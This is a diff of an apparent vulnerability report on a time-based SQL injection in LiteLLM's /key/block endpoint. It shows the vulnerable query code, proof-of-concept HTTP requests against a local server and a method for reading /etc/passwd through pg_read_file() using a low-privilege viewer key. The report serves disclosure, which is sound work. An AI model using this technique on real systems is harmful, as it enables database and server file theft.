@@ -1,5 +1,6 @@
 # Description
-There is sql injection in this endpoint `/key/block`.
+There is sql injection in this endpoint `/key/block`. A proxy_admin_viewer API key can also achieve arbitrary file reading on the server.
+
 This code exhibits a vulnerability. If `token` variable contain malicious data, it can lead to a SQL Injection, which could further enable a Local File Read.
 ```
 sql_query = f"""
@@ -25,14 +26,25 @@ WHERE v.token = '{token}'
 """
 ```
 
+The proxy_admin can create proxy_admin_viewer accounts via "Invite User," as documented at LiteLLM Documentation. According to specifications:
+
+Proxy Admin: Can create keys, teams, users, add models, etc.
+
+Proxy Admin Viewer: Can just view spend. They cannot create keys, teams or grant users access to new models.
+
+So the proxy_admin_viewer has limited permissions and cannot be the server's super administrator.
+
  # Proof of Concept
 1. Login into admin panel with username `admin` and password `sk-1234`.
-2. Send the following POC to the `/key/block`. You can see that it sleeps for 5 seconds. This demonstrates the existence of a time-based SQL injection here.
+2. Create a Proxy Admin Viewer account.
+3. Generate a Proxy Admin Viewer API key. 
+4. Send the following POC to the `/key/block`. You can see that it sleeps for 5 seconds. This demonstrates the existence of a time-based SQL injection here.
+5. Using this key to perform a delayed SQL injection, the subsequent operations are the same as I initially mentioned, allowing arbitrary database reading and server file access, which can lead to sensitive information leakage and server compromise.
 ```
 POST /key/block HTTP/1.1
 Host: 127.0.0.1:4000
 Content-Length: 115
-Authorization: Bearer sk--OfzCyUwBZt3rpcddaguWw
+Authorization: Bearer sk-5pUqaVXkY6DaR1zEKKnwwA
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
 Content-Type: application/json
 Accept: */*
@@ -49,7 +61,7 @@ Connection: close
 POST /key/block HTTP/1.1
 Host: 127.0.0.1:4000
 Content-Length: 115
-Authorization: Bearer sk--OfzCyUwBZt3rpcddaguWw
+Authorization: Bearer sk-5pUqaVXkY6DaR1zEKKnwwA
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
 Content-Type: application/json
 Accept: */*
@@ -63,9 +75,10 @@ Connection: close
 ```
 Send the request packet to Burp Intruder, modify the offset of the `pg_read_file()` function, then iterate through all characters for matching. Identify the character that causes a delayed response. The following image proves that the first two characters of `/etc/passwd` are 'r' and 'o'. By using this method, you can obtain the entire content of the file.
 
-![551729649470_ pic](https://github.com/user-attachments/assets/98c0bb9f-03a8-43ec-b980-87d114e87362)
-![541729649429_ pic](https://github.com/user-attachments/assets/e2f8d555-a4e9-4a0a-b655-01d8fd6d8f10)
+<img width="1346" alt="1221741188004_ pic" src="https://github.com/user-attachments/assets/1e922130-a0ed-4c21-b07f-cbe32da1a913" />
 
+<img width="1262" alt="1211741187925_ pic" src="https://github.com/user-attachments/assets/e0ffdd38-fea0-49cf-98d3-0e6922b6c7cc" />
 
+<img width="1262" alt="1241741190564_ pic" src="https://github.com/user-attachments/assets/9f9d79b7-daca-4c31-b5ea-a60fd173783d" />
 
 
